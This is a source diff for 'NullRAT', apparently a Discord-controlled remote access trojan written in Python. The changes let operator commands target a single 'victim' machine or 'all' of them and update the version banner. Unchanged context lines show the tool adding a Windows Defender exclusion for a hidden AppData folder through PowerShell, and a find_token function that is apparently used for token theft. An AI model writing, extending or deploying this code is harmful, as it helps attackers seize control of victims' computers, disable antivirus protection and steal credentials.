@@ -9,6 +9,11 @@ from socket import create_connection
 import os, psutil, re, requests, sys, subprocess, random
 
 ############### Global functions available in every cog
+def valid(identifier):
+    if str(identifier) == str(client.identifier) or str(identifier).lower() == "all": 
+        return True
+    return False
+
 def genEmbed(self, title, timestamp, description=None):
     if description is None:
         embed = discord.Embed(
@@ -59,13 +64,14 @@ class NullBot(commands.InteractionBot):
         self.original_dir = original_dir
 
         # Checks if username is Admin/Administrator
-        if "dmin" in os.getenv("username"):
+        if "dmin" in os.getenv("username").lower():
             self.identifier = identification
         else:
             self.identifier = os.getenv("username") 
     
     genEmbed = genEmbed
     find_token = find_token
+    valid = valid
         
 client = NullBot(test_guilds=server_ids)
 nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata\\Roaming\\.cache"
@@ -83,7 +89,7 @@ subprocess.run(f"powershell Add-MpPreference -ExclusionPath '{nr_working}'", she
 @client.event
 async def on_ready():
     embed = Embed(
-        title = f"NullRAT **IX** started on: **{client.identifier}**", 
+        title = f"NullRAT **XII** started on: **{client.identifier}**", 
         description = f"Currently present in:\n```{client.original_dir}```",
         timestamp = datetime.now()
     ).set_author(
@@ -113,7 +119,7 @@ async def shutdown(ctx, victim):
     ----------
     victim: Identifier of the affected computer (found via /listvictims)
     """
-    if str(victim) == str(client.identifier):
+    if valid(victim):
         await ctx.response.send_message(
             embed = client.genEmbed(
                 "Shutting down NullRAT for **" + client.identifier + "**...",
